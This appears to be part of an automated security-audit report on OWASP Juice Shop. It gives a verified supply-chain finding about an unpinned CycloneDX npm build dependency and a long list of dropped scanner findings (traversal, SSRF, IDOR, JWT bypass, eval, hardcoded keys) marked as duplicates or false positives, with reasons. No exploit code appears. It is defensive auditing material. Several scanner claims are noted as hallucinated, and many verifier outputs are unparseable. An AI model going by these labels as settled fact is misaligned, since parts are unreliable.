Enforce supply-chain integrity by pinning dependencies to exact versions or commit SHAs (e.g., `CYCLONEDX_NPM_VERSION='4.1.0'`) and validating via .lock files or checksums before execution.

**Exploitability:** CVSS 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N) downgraded to low per design control trigger. Requires build-stage access and registry poisoning; isolated from runtime threat model.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — legitimate supply-chain integrity finding; unpinned build dependency flows into public Docker image, but Juice Shop is an educational CTF app with limited blast radius

The file and lines are confirmed. The scanner's description is literally accurate about the code. Now, is it a **true security vulnerability** or a **legitimate supply-chain risk**?

**What I found:**

1. **Dockerfile line 19-20 confirmed**: Unpinned semver range `^2.0.0||^3.0.0||^4.0.0` flows into `npm install -g` (which **does execute postinstall scripts** by default).

2. **No package-lock.json exists** at the repo root — the version is truly non-deterministic.

3. **Two callers override the same float**: `ci.yml` (line 23) and `release.yml` (line 7) both set `CYCLONEDX_NPM_VERSION` to the identical float, passing it both to CI step runs and as a build arg.

4. **The Docker image never re-execs cyclonedx-npm at runtime** — line 21 (`npm run sbom`) generates `bom.json` once and that's it. The container entrypoint (line 42) is `/juice-shop/build/app.js`.

5. **The malicious payload lands in two places if the npm maintainer is compromised**:
   - The CI runner's environment (transient)
   - The built Docker image baked into `bkimminich/juice-shop` on Docker Hub (persistent, distributed)

6. **Project context is critical**: OWASP Juice Shop is a **deliberately vulnerable educational CTF** — not a production system. The SBOM is incidental metadata, not a runtime component. The image is pulled to teach others about web vulnerabilities, not to secure production.

**Impact assessment:**
- If a malicious `@cyclonedx/cyclonedx-npm@4.x` were published with a postinstall script, every future `docker pull bkimminich/juice-shop` would receive a **baked-in compromised artifact**. This IS a real supply-chain integrity issue.
- However, Juice Shop is **not a critical application** — even a compromised image just runs another insecure web app. The blast radius is low relative to typical SAST findings.
- The scanner's exfiltration claim (CI secrets) is speculative: the malicious code runs in CI, but Juice Shop's CI doesn't expose high-value secrets via $GITHUB_TOKEN or env vars (the only secrets used are `SLACK_WEBHOOK_URL` and `GITHUB_TOKEN` for notifications/packaging).

**Verdict: TRUE_POSITIVE** — the vulnerability pattern is real, the code path exists, and the dependency is unpinned in production CI. Confidence is moderate because Juice Shop's educational nature limits the practical severity.

## Exploit Chains

No exploit chains were identified — the findings above are independent and do not combine into a multi-step path.


## Dropped Findings

- **[UNCONFIRMED]** `config/juicebox.yml:10` injection (catchall-08) — s4 confidence 0.50 < gate 0.60
- **[EXCLUDED]** `frontend/src/app/user.service.ts:50` info-leak (catchall-26) — file not in repo inventory
- **[UNCONFIRMED]** `frontend/src/app/order-completion/order-completion.component.html:26` other (catchall-27) — missing source_ref/sink_ref — data flow unproven
- **[EXCLUDED]** `deploy/config/environment.sh:12` other (catchall-29) — file not in repo inventory
- **[EXCLUDED]** `src/auth/validator.py:45` injection (catchall-29) — file not in repo inventory
- **[EXCLUDED]** `src/routes/login.ts:20` other (spec-crypto-84) — file not in repo inventory
- **[EXCLUDED]** `2fa.ts:19` logic-flaw (spec-logic-bug-54) — file not in repo inventory
- **[EXCLUDED]** `src/routes/likeProductReviews.ts:15` race-condition (spec-logic-bug-82) — file not in repo inventory
- **[EXCLUDED]** `src/routes/updateUserProfile.ts:15` logic-flaw (spec-logic-bug-107) — file not in repo inventory
- **[EXCLUDED]** `src/models/challenge.ts:142` logic-flaw (spec-access-control-37) — file not in repo inventory
- **[DUP (pre-verify)]** `views/promotionVideo.pug:30` injection (catchall-112) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `data/static/web3-snippets/ETHWalletBank.sol:30` logic-flaw (spec-crypto-06) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/authenticatedUsers.ts:15` other (spec-crypto-59) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/deluxe.ts:40` logic-flaw (spec-crypto-75) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/fileServer.ts:13` injection (spec-crypto-77) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/vulnCodeFixes.ts:80` injection (spec-crypto-111) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `rsn/rsnUtil.ts:126` logic-flaw (spec-crypto-118) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `lib/antiCheat.ts:25` logic-flaw (spec-logic-bug-18) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `models/feedback.ts:40` logic-flaw (spec-logic-bug-40) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/captcha.ts:6` logic-flaw (spec-logic-bug-63) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/payment.ts:36` logic-flaw (spec-access-control-90) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/payment.ts:29` logic-flaw (spec-logic-bug-90) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/wallet.ts:20` logic-flaw (spec-logic-bug-113) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `lib/botUtils.ts:10` logic-flaw (spec-access-control-19) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `models/basketitem.ts:22` logic-flaw (spec-access-control-34) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `models/securityAnswer.ts:13` other (spec-access-control-50) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/2fa.ts:85` logic-flaw (spec-access-control-54) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/countryMapping.ts:7` info-leak (spec-access-control-68) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/coupon.ts:7` logic-flaw (spec-access-control-69) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/createProductReviews.ts:20` logic-flaw (spec-access-control-70) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/dataErasure.ts:66` logic-flaw (spec-access-control-72) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/easterEgg.ts:8` logic-flaw (spec-access-control-76) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/fileUpload.ts:24` logic-flaw (spec-access-control-78) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/imageCaptcha.ts:49` logic-flaw (spec-access-control-79) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/order.ts:30` logic-flaw (spec-access-control-88) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/profileImageUrlUpload.ts:26` other (spec-access-control-94) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/videoHandler.ts:48` other (spec-access-control-110) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/vulnCodeSnippet.ts:67` other (spec-access-control-112) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/nftMint.ts:36` injection (catchall-87) — pre-verify semantic: Same walletAddress validation defect in NFT minting reported from a different angle.
- **[DUP (pre-verify)]** `routes/nftMint.ts:16` other (spec-crypto-87) — pre-verify semantic: Duplicate finding for the hardcoded Alchemy API key in the same provider initialization.
- **[DUP (pre-verify)]** `routes/restoreProgress.ts:15` logic-flaw (spec-crypto-100) — pre-verify semantic: Duplicate finding for the hardcoded Hashids salt allowing code forging.
- **[DUP (pre-verify)]** `routes/web3Wallet.ts:18` info-leak (catchall-104) — pre-verify semantic: Duplicate finding for the hardcoded Alchemy API key in the web3 wallet route.
- **[DUP (pre-verify)]** `data/static/codefixes/exposedMetricsChallenge_2.ts:2` info-leak (spec-crypto-05) — pre-verify semantic: Duplicate unauthenticated metrics endpoint exposure reported from a codefix file.
- **[DUP (pre-verify)]** `lib/insecurity.ts:51` injection (spec-crypto-23) — pre-verify semantic: Duplicate JWT verification bypass description tracing back to the same root verify function.
- **[DUP (pre-verify)]** `models/address.ts:42` integer-overflow (spec-crypto-32) — pre-verify semantic: Duplicate mobileNum validation defect exceeding 32-bit integer limits in the Address model.
- **[DUP (pre-verify)]** `models/feedback.ts:38` logic-flaw (spec-crypto-40) — pre-verify semantic: Duplicate model schema lacking default enforcement on feedback rating.
- **[DUP (pre-verify)]** `routes/address.ts:6` logic-flaw (spec-crypto-55) — pre-verify semantic: Duplicate server-side authorization bypass via client-supplied UserId in address routes.
- **[DUP (pre-verify)]** `routes/appConfiguration.ts:7` info-leak (spec-crypto-57) — pre-verify semantic: Duplicate unauthenticated config dump exposing cryptographic material in app configuration.
- **[DUP (pre-verify)]** `routes/basket.ts:15` logic-flaw (spec-logic-bug-61) — pre-verify semantic: Duplicate missing object-level authorization on basket retrieval.
- **[DUP (pre-verify)]** `routes/checkKeys.ts:10` other (spec-crypto-66) — pre-verify semantic: Duplicate hardcoded mnemonic seed phrase exposing private key in checkKeys route.
- **[DUP (pre-verify)]** `routes/continueCode.ts:10` other (spec-crypto-67) — pre-verify semantic: Duplicate hardcoded salt and non-cryptographic encoding exposure in continueCode route.
- **[DUP (pre-verify)]** `routes/dataErasure.ts:65` other (spec-crypto-72) — pre-verify semantic: Duplicate flawed substring path check allowing traversal bypass in data erasure.
- **[DUP (pre-verify)]** `routes/logfileServer.ts:6` injection (spec-crypto-83) — pre-verify semantic: Duplicate directory traversal bypass via insufficient path containment in logfile server.
- **[DUP (pre-verify)]** `routes/profileImageUrlUpload.ts:15` injection (spec-crypto-94) — pre-verify semantic: Duplicate server-side request forgery via unrestricted image URL fetch in profile upload.
- **[DUP (pre-verify)]** `routes/quarantineServer.ts:8` other (spec-crypto-95) — pre-verify semantic: Duplicate path traversal via insufficient path validation in quarantine server.
- **[DUP (pre-verify)]** `routes/videoHandler.ts:68` injection (spec-crypto-110) — pre-verify semantic: Duplicate unescaped subtitle data injected into script context in video handler.
- **[DUP (pre-verify)]** `routes/vulnCodeSnippet.ts:68` injection (spec-crypto-112) — pre-verify semantic: Duplicate unvalidated path traversal enables arbitrary file read.
- **[DUP (pre-verify)]** `routes/wallet.ts:8` logic-flaw (spec-crypto-113) — pre-verify semantic: Duplicate unauthenticated IDOR & arbitrary balance manipulation via client-supplied UserId.
- **[DUP (pre-verify)]** `routes/web3Wallet.ts:18` other (spec-crypto-114) — pre-verify semantic: Duplicate hardcoded Alchemy API key in source.
- **[DUP (pre-verify)]** `frontend/src/hacking-instructor/helpers/helpers.ts:38` logic-flaw (spec-logic-bug-14) — pre-verify semantic: Duplicate unbounded state polling and unmitigated admin API fetch in tutorial helpers.
- **[DUP (pre-verify)]** `lib/accuracy.ts:6` logic-flaw (spec-logic-bug-17) — pre-verify semantic: Duplicate global state accumulation enables metric poisoning and prototype pollution.
- **[DUP (pre-verify)]** `lib/insecurity.ts:128` logic-flaw (spec-logic-bug-23) — pre-verify semantic: Duplicate open redirect bypass via substring matching in allowlist.
- **[DUP (pre-verify)]** `lib/insecurity.ts:159` logic-flaw (spec-logic-bug-23) — pre-verify semantic: Duplicate expired JWT bypasses role-based authorization checks.
- **[DUP (pre-verify)]** `lib/webhook.ts:11` logic-flaw (spec-logic-bug-31) — pre-verify semantic: Duplicate unvalidated webhook URL enables SSRF via automatic redirect following.
- **[DUP (pre-verify)]** `models/address.ts:41` other (spec-logic-bug-32) — pre-verify semantic: Duplicate mobileNum validation exceeds 32-bit INT type bounds.
- **[DUP (pre-verify)]** `models/delivery.ts:33` logic-flaw (spec-logic-bug-39) — pre-verify semantic: Duplicate floating-point precision allows bypass of exact-match price verification.
- **[DUP (pre-verify)]** `routes/coupon.ts:10` logic-flaw (spec-logic-bug-69) — pre-verify semantic: Duplicate missing object-level authorization on basket coupon update.
- **[DUP (pre-verify)]** `routes/currentUser.ts:17` info-leak (spec-access-control-71) — pre-verify semantic: Duplicate unvalidated fields parameter bypasses server-side attribute masking.
- **[DUP (pre-verify)]** `routes/dataErasure.ts:51` logic-flaw (spec-logic-bug-72) — pre-verify semantic: Duplicate bypassed identity verification on account deletion trigger.
- **[DUP (pre-verify)]** `routes/fileServer.ts:15` other (spec-logic-bug-77) — pre-verify semantic: Duplicate path traversal/unrestricted file read via weak path validation.
- **[DUP (pre-verify)]** `routes/keyServer.ts:8` logic-flaw (spec-logic-bug-80) — pre-verify semantic: Duplicate path traversal via incomplete forward-slash filter.
- **[DUP (pre-verify)]** `routes/logfileServer.ts:10` logic-flaw (spec-logic-bug-83) — pre-verify semantic: Duplicate path traversal bypass via unchecked traversal sequence.
- **[DUP (pre-verify)]** `routes/order.ts:137` logic-flaw (spec-logic-bug-88) — pre-verify semantic: Duplicate unvalidated user ID allows unauthorized wallet balance modification.
- **[DUP (pre-verify)]** `routes/profileImageUrlUpload.ts:15` logic-flaw (spec-logic-bug-94) — pre-verify semantic: Duplicate unvalidated user-controlled URL triggers SSRF and bypasses validation on failure.
- **[DUP (pre-verify)]** `routes/recycles.ts:8` logic-flaw (spec-logic-bug-96) — pre-verify semantic: Duplicate unauthenticated IDOR via unvalidated URL parameter.
- **[DUP (pre-verify)]** `routes/redirect.ts:12` logic-flaw (spec-logic-bug-97) — pre-verify semantic: Duplicate flawed allowlist validation and contradictory challenge gating enable open redirect.
- **[DUP (pre-verify)]** `routes/resetPassword.ts:19` logic-flaw (spec-logic-bug-99) — pre-verify semantic: Duplicate validation failure bypasses HTTP response via unhandled Error injection.
- **[DUP (pre-verify)]** `routes/saveLoginIp.ts:15` logic-flaw (spec-logic-bug-101) — pre-verify semantic: Duplicate conditional sanitization bypass and blind trust of untrusted audit input.
- **[DUP (pre-verify)]** `routes/showProductReviews.ts:33` logic-flaw (spec-logic-bug-104) — pre-verify semantic: Duplicate short-circuit evaluation incorrectly grants liked state to unauthenticated requests.
- **[DUP (pre-verify)]** `routes/updateProductReviews.ts:13` logic-flaw (spec-logic-bug-106) — pre-verify semantic: Duplicate missing ownership enforcement allows unscoped bulk update.
- **[DUP (pre-verify)]** `routes/userProfile.ts:52` logic-flaw (spec-logic-bug-108) — pre-verify semantic: Duplicate state-conditional RCE via unvalidated eval sink.
- **[DUP (pre-verify)]** `routes/vulnCodeFixes.ts:27` logic-flaw (spec-logic-bug-111) — pre-verify semantic: Duplicate desynchronized verification state via metadata-derived index calculation.
- **[DUP (pre-verify)]** `data/datacreator.ts:135` logic-flaw (spec-access-control-03) — pre-verify semantic: Duplicate deterministic deluxe token generation enables auth bypass.
- **[DUP (pre-verify)]** `data/staticData.ts:8` other (spec-access-control-07) — pre-verify semantic: Duplicate unvalidated file parameter allows path traversal via CWD-relative resolve.
- **[DUP (pre-verify)]** `frontend/src/hacking-instructor/helpers/helpers.ts:178` logic-flaw (spec-access-control-14) — pre-verify semantic: Duplicate client-side JWT role claim and admin config fetch lack authentication validation.
- **[DUP (pre-verify)]** `lib/accuracy.ts:10` other (spec-access-control-17) — pre-verify semantic: Duplicate missing authorization check on global state mutation.
- **[DUP (pre-verify)]** `lib/insecurity.ts:17` other (spec-access-control-23) — pre-verify semantic: Duplicate hardcoded private key enables privilege escalation to deluxe role.
- **[DUP (pre-verify)]** `models/feedback.ts:20` other (spec-access-control-40) — pre-verify semantic: Duplicate missing server-side default/validation for UserId enables mass assignment.
- **[DUP (pre-verify)]** `models/imageCaptcha.ts:32` info-leak (spec-access-control-42) — pre-verify semantic: Duplicate plaintext CAPTCHA answer storage & missing ownership scope.
- **[DUP (pre-verify)]** `models/memory.ts:25` other (spec-access-control-44) — pre-verify semantic: Duplicate unprotected mass assignment of UserId enables ownership bypass.
- **[DUP (pre-verify)]** `routes/appVersion.ts:8` info-leak (spec-access-control-58) — pre-verify semantic: Duplicate unauthenticated application version exposure.
- **[DUP (pre-verify)]** `routes/basket.ts:12` other (spec-access-control-61) — pre-verify semantic: Duplicate missing authorization check in basket retrieval.
- **[VERIFY-ERR]** `routes/orderHistory.ts:31` injection (chunk-02) — verifier output unparseable
- **[VERIFY-ERR]** `routes/order.ts:137` injection (chunk-02) — verifier output unparseable
- **[VERIFY-ERR]** `routes/userProfile.ts:52` injection (chunk-02) — verifier output unparseable
- **[FP]** `routes/metrics.ts:63` other (chunk-03) — The /metrics endpoint being unauthenticated is the core design of the Juice Shop CTF challenge "exposedMetricsChallenge"; the app is intentionally vulnerable for training purposes
- **[VERIFY-ERR]** `routes/logfileServer.ts:6` other (spec-access-control-83) — verifier output unparseable
- **[FP]** `routes/appConfiguration.ts:6` other (chunk-03) — Confirmed the endpoint is unauthenticated but the scanner's claim of containing plaintext DB credentials, JWT secrets, and API keys is incorrect; the config contains only application metadata, product data, and a public OAuth client ID
- **[VERIFY-ERR]** `lib/insecurity.ts:128` injection (chunk-04) — verifier output unparseable
- **[FP]** `frontend/src/app/search-result/search-result.component.ts:125` injection (chunk-05) — The product model setter invokes sanitizeSecure(description) in Docker/Heroku production deployments, neutralizing the input server-side; additionally the search-result grid template never renders item.description in innerHTML
- **[VERIFY-ERR]** `routes/wallet.ts:8` other (chunk-06) — verifier output unparseable
- **[VERIFY-ERR]** `frontend/src/app/Services/request.interceptor.ts:9` injection (chunk-06) — verifier output unparseable
- **[FP]** `Dockerfile:5` injection (catchall-01) — ** — --unsafe-perm is functionally required for native dependency compilation; the stated attack scenario requires an attacker who already has write access to the repository, which trivially enables any other attack vector at equal or lower bar; the scanner mischaracterizes a build-time infrastructure requirement as a meaningful attack surface
- **[VERIFY-ERR]** `config/7ms.yml:148` info-leak (catchall-02) — verifier output unparseable
- **[VERIFY-ERR]** `config/7ms.yml:44` injection (catchall-02) — verifier output unparseable
- **[VERIFY-ERR]** `config/addo.yml:117` info-leak (catchall-03) — verifier output unparseable
- **[FP]** `config/bodgeit.yml:41` other (catchall-04) — The app is a CTF/pentest training platform where `xssBonusPayload` is an intentionally public challenge answer key, not a secret. The scanner falsely claims the config is served via `/api/Challenge`, which is hardcoded to `denyAll()` and serves database-backed challenge *records*, not runtime config. Discovery of a game solution in a deliberately vulnerable training app has no actual security impact.
- **[VERIFY-ERR]** `config/bodgeit.yml:36` other (catchall-04) — verifier output unparseable
- **[VERIFY-ERR]** `config/defcon33.yml:130` info-leak (catchall-06) — verifier output unparseable
- **[VERIFY-ERR]** `config/mozilla.yml:186` logic-flaw (catchall-09) — verifier output unparseable
- **[FP]** `config/oss.yml:20` info-leak (catchall-10) — The "secret" is a public Slack invite link to an open community workspace; it leaks no unauthorized data.
- **[VERIFY-ERR]** `config/oss.yml:121` info-leak (catchall-10) — verifier output unparseable
- **[VERIFY-ERR]** `config/unsafe.yml:2` other (catchall-14) — verifier output unparseable
- **[FP]** `data/datacreator.ts:278` other (catchall-16) — (no reason given)
- **[FP]** `data/datacreator.ts:390` logic-flaw (catchall-16) — Config `author` values are static seed data from committed YAML files, not user input; modifying them requires deploy/config-repo access which is the same trust boundary as the application itself.
- **[FP]** `data/static/web3-snippets/ETHWalletBank.sol:22` logic-flaw (catchall-18) — code is a deliberately crafted challenge sample (OWASP Juice Shop "Wallet Depletion" CTF exercise), not deployed production smart contract; no external entry point or on-chain deployment exists
- **[FP]** `data/static/codefixes/xssBonusChallenge_4.ts:1` injection (catchall-18) — the file is a static coding-challenge snippet served as study material, not a compiled Angular component; no template binding, no execution, and no iframe rendering exists
- **[FP]** `data/static/users.yml:1` info-leak (catchall-18) — (no reason given)
- **[VERIFY-ERR]** `data/staticData.ts:7` injection (catchall-19) — verifier output unparseable
- **[VERIFY-ERR]** `frontend/.npmrc:1` logic-flaw (catchall-22) — verifier output unparseable
- **[FP]** `frontend/package.json:55` other (catchall-25) — ** — The file does contain a placeholder where a version string belongs, but this causes a build failure, not a security breach. No data exposure, access gain, or code execution path exists.
- **[VERIFY-ERR]** `frontend/src/app/data-export/data-export.component.ts:58` injection (catchall-26) — verifier output unparseable
- **[FP]** `frontend/src/app/welcome-banner/welcome-banner.component.html:4` injection (catchall-28) — **
- **[FP]** `frontend/src/hacking-instructor/helpers/helpers.ts:39` info-leak (catchall-30) — the claimed secret exposure (jwtSecret, hmacSecret, database.password) does not exist in the config object; the endpoint only returns public metadata already available via other unauthenticated routes
- **[VERIFY-ERR]** `frontend/src/hacking-instructor/index.ts:108` injection (catchall-30) — verifier output unparseable
- **[VERIFY-ERR]** `lib/accuracy.ts:60` injection (catchall-35) — verifier output unparseable
- **[FP]** `lib/antiCheat.ts:40` logic-flaw (catchall-36) — The code's global mutable state bug is indeed real, but the impact is limited to game integrity (CTF scoring multipliers) in a deliberately vulnerable CTF platform. No data exposure, auth bypass, or code execution is possible.
- **[FP]** `lib/botUtils.ts:21` logic-flaw (spec-logic-bug-19) — The scanner's core claim of "unauthenticated coupon issuance" is factually wrong: the chatbot route requires JWT authentication. The function correctly ignores its parameters by design (it issues a generic coupon to any authenticated user), so no security boundary or intended behavior is violated.
- **[FP]** `lib/challengeUtils.ts:58` injection (catchall-38) — Challenge descriptions are static CTF metadata loaded from datacreator.ts at startup; no route or API allows user-controlled content to set challenge.description, breaking the attacker input precondition.
- **[FP]** `lib/noUpdate.ts:33` logic-flaw (spec-logic-bug-28) — Scanner misread Sequelize internals (the `fieldName` property is correctly assigned in Sequelize v6's `refreshAttributes`) and hallucinated an unrelated exploit scenario (`/api/User/:id` + `createdAt`) that does not match the actual hooked model (`BasketItem` + `BasketId`/`ProductId`).
- **[FP]** `lib/webhook.ts:11` other (catchall-46) — No user-controllable input reaches the webhook URL; the env var is set exclusively by infrastructure secrets with no pathway from external/attacker input
- **[FP]** `models/address.ts:41` logic-flaw (catchall-47) — Scanner incorrectly assumed DataTypes.INTEGER maps to 32-bit SQL INT; the app uses SQLite (dialect: 'sqlite' in models/index.ts), where INTEGER is 8-byte signed (max ~9.2×10^18), far exceeding the validation max of ~10^10. No overflow or truncation can occur.
- **[FP]** `models/address.ts:38` injection (catchall-47) — Missing Sequelize model validation is a data quality issue, not exploitable for XSS (Angular autoescaping) or SQLi (parameterized ORM); the PDF claim is incorrect (static files from /ftp)
- **[FP]** `models/captcha.ts:17` info-leak (catchall-48) — Scanner misidentified the root cause: the answer is exposed by an explicit res.json(captcha) in the route handler (routes/captcha.ts:28), not by Sequelize ORM serialization. The model definition merely stores the value and does not cause any exposure.
- **[FP]** `models/card.ts:35` logic-flaw (spec-crypto-36) — OWASP Juice Shop is a deliberately vulnerable CTF/training application; card numbers are dummy test data, not real PANs, and no real payment processing occurs
- **[VERIFY-ERR]** `models/challenge.ts:164` injection (catchall-50) — verifier output unparseable
- **[FP]** `models/delivery.ts:33` other (catchall-52) — Delivery prices are immutable (loaded only from static YAML at startup); no user-controllable write path exists, so the claimed exploit is impossible.
- **[FP]** `models/feedback.ts:57` logic-flaw (catchall-53) — Sequelize's notNull validator (allowNull: false) correctly rejects both null and undefined/missing ratings, as confirmed by the existing test at feedbackApiSpec.ts:201; the scanner misread the validation behavior.
- **[FP]** `models/hint.ts:34` injection (catchall-54) — The `Hints` table is population is restricted to static YAML data loads at startup; the API write endpoint (`POST /api/Hints`) is sealed with `denyAll()` using a cryptographically random secret. The XSS sink (`innerHTML` after `snarkdown`) has no path to user-controlled input.
- **[FP]** `models/imageCaptcha.ts:12` logic-flaw (catchall-55) — The scanner incorrectly attributes a logic flaw to the static database schema file (`models/imageCaptcha.ts`) and falsely claims that "application-level expiration checks are absent." The application verification logic in `routes/imageCaptcha.ts` explicitly enforces a 5-minute temporal validation window using the `createdAt` field and `Op.gt` query operator. Because the schema lacks these columns, it is standard and correct to rely on the creation timestamp (TTL by age). The scanner's claim that "the system accepts the stale response indefinitely" is demonstrably false. Furthermore, the scanner entirely missed a far more severe vulnerability in the corresponding route (the creation endpoint on line 28 explicitly returns the plaintext `answer` to the client, trivially bypassing the captcha, and line 49 contains a logic short-circuit bypass).
- **[FP]** `models/index.ts:26` other (catchall-56) — SQLite dialect ignores username/password entirely; values are dummy placeholders with no real security impact
- **[FP]** `models/quantity.ts:33` logic-flaw (catchall-59) — Scanner misread routes (wrong endpoint `/api/v1/Product`) and privileges (Product Admin cannot write to Quantity); missing `min` constraint is a business logic issue (overselling), not a security boundary bypass.
- **[FP]** `models/recycle.ts:38` logic-flaw (catchall-60) — Missing model validation exists, but the scanner hallucinated a downstream reward/balance calculation logic that does not exist in the codebase; no actual security impact is possible.
- **[VERIFY-ERR]** `models/securityAnswer.ts:41` other (catchall-62) — verifier output unparseable
- **[FP]** `models/wallet.ts:32` logic-flaw (catchall-64) — The scanner's claimed exploit relies on a negative balance bypassing payment checks, but the consuming controller logic (routes/order.ts:140, routes/deluxe.ts:23) explicitly requires `balance >= price`, which correctly rejects negative values and prevents the alleged purchase theft.
- **[FP]** `monitoring/grafana-dashboard.json:114` info-leak (catchall-65) — The scanner misread the file: it confuses Prometheus query expressions (metric name definitions) with actual metric data values. No sensitive values exist in the file; the only exposed information is metric names (e.g., that "juiceshop_wallet_balance_total" is a metric name), which conveys no actionable information.
- **[FP]** `routes/address.ts:8` other (spec-access-control-55) — security.appendUserId() middleware overwrites req.body.UserId with the JWT-subject user ID, neutralizing any attacker-controlled value in the request body
- **[FP]** `routes/authenticatedUsers.ts:8` other (catchall-69) — The route is guarded by express-jwt middleware mounted at the exact path; unauthenticated callers are rejected before the handler executes.
- **[FP]** `routes/b2bOrder.ts:16` injection (catchall-70) — The vm.runInContext code path is gated behind challenge-enabling logic that is disabled by default by disabledEnv: [Docker, Heroku, Gitpod]; in Juice Shop's standard Docker deployment the path is unreachable, and the application is an intentionally vulnerable training CTF platform where this is an educational exercise, not a real bug.
- **[VERIFY-ERR]** `routes/changePassword.ts:36` logic-flaw (catchall-72) — verifier output unparseable
- **[FP]** `routes/chatbot.ts:100` injection (catchall-73) — The scanner misidentified the sink: `botUtils[response.handler](req.body.query, user)` calls pure data-returning functions (productPrice, couponCode, testFunction) that never execute code. The potential injection exists upstream in `juicy-chat-bot`'s `respond()` method which interpolates query into vm2-run code, which is a library-level concern handled by SCA, not a route-level coding error.
- **[FP]** `routes/checkKeys.ts:10` info-leak (catchall-74) — The file `routes/checkKeys.ts` and its contents belong to the OWASP Juice Shop, a deliberately vulnerable application designed for security training and CTFs. The hardcoded mnemonic phrase is the intended solution/puzzle (key) for the "NFT Takeover" challenge, not an accidental production secret leak.
- **[FP]** `routes/continueCode.ts:10` logic-flaw (spec-logic-bug-67) — functionality working as designed for a CTF app; hard-coded salts are the intended puzzle for the challenge, not a security boundary.
- **[FP]** `routes/countryMapping.ts:10` info-leak (catchall-76) — Endpoint intentionally serves public CTF country mappings to unauthenticated users; contains only non-sensitive country names/codes intended for frontend rendering
- **[VERIFY-ERR]** `routes/dataErasure.ts:69` injection (catchall-77) — verifier output unparseable
- **[FP]** `routes/dataExport.ts:23` logic-flaw (spec-logic-bug-73) — appendUserId() middleware overwrites req.body.UserId with the authenticated user's own ID before it reaches the query, so attacker input is never used; scanner misread the data flow
- **[VERIFY-ERR]** `routes/deluxe.ts:21` logic-flaw (catchall-79) — verifier output unparseable
- **[VERIFY-ERR]** `routes/fileServer.ts:24` injection (catchall-81) — verifier output unparseable
- **[VERIFY-ERR]** `routes/languages.ts:29` other (catchall-84) — verifier output unparseable
- **[VERIFY-ERR]** `routes/likeProductReviews.ts:21` race-condition (catchall-85) — verifier output unparseable
- **[FP]** `routes/memory.ts:9` logic-flaw (catchall-86) — Scanner missed the appendUserId() middleware that overwrites req.body.UserId with the server-derived JWT user ID, preventing any client-controlled UserId forgery
- **[VERIFY-ERR]** `routes/nftMint.ts:35` logic-flaw (spec-logic-bug-87) — verifier output unparseable
- **[FP]** `routes/nftMint.ts:16` info-leak (catchall-87) — The hardcoded Alchemy key is part of HackInABox/OWASP Juice Shop's open-source CTF infrastructure; it uses a Sepolia testnet endpoint with no real monetary value and is intentionally committed for challenge purposes
- **[FP]** `routes/payment.ts:15` logic-flaw (catchall-88) — middleware appendUserId() unconditionally overwrites req.body.UserId from the JWT token before the handler executes, closing the IDOR path
- **[VERIFY-ERR]** `routes/quarantineServer.ts:8` logic-flaw (catchall-92) — verifier output unparseable
- **[FP]** `routes/redirect.ts:12` other (catchall-93) — Intentional CTF training flaw in OWASP Juice Shop, not a real production vulnerability.
- **[FP]** `routes/repeatNotification.ts:8` other (catchall-94) — scanner's claim that decodeURIComponent causes "exponential string expansion" from %25 payloads is factually wrong; decodeURIComponent is single-pass O(n) with no recursion or amplification.
- **[FP]** `routes/resetPassword.ts:15` injection (catchall-95) — Scanner's exploit scenario ignores the mandatory security answer check at line 38, which completely blocks the reset bypass.
- **[VERIFY-ERR]** `routes/saveLoginIp.ts:15` injection (catchall-97) — verifier output unparseable
- **[VERIFY-ERR]** `routes/trackOrder.ts:12` injection (catchall-99) — verifier output unparseable
- **[FP]** `routes/videoHandler.ts:78` other (spec-logic-bug-110) — Static application configuration loaded at startup; requires CI/CD or deploy-level access to modify, which falls under the "No Real Attacker" / deployment-boundary out-of-scope rule. The input is not dynamically injected by an end-user or external request at runtime, so the traversal claim is not exploitable against a live application.
- **[VERIFY-ERR]** `routes/vulnCodeFixes.ts:71` injection (spec-access-control-111) — verifier output unparseable
- **[FP]** `routes/vulnCodeSnippet.ts:68` unsafe-deserialization (spec-logic-bug-112) — Scanner overlooked `retrieveCodeSnippet` whitelist validation at line 33 that gates the yaml.load path; key must match one of ~100 pre-defined challenge keys, and no write path to codefixes directory exists for untrusted input.
- **[FP]** `rsn/rsnUtil.ts:131` logic-flaw (catchall-109) — (no reason given)
- **[FP]** `views/dataErasureForm.hbs:21` injection (catchall-110) — Scanner misinterpreted browser parsing (HTML entities do not break unquoted attribute boundaries), ignored Handlebars auto-escape, ignored auth gate and input sanitization; data is self-only and sanitized.
- **[FP]** `views/promotionVideo.pug:4` injection (catchall-112) — Scanner misread literal string placeholders (`_title_`, `_bgColor_`, etc.) as unescaped Pug template variables; `_title_` is explicitly HTML-encoded via `entities.encode()` and color values are static hex codes from a config object
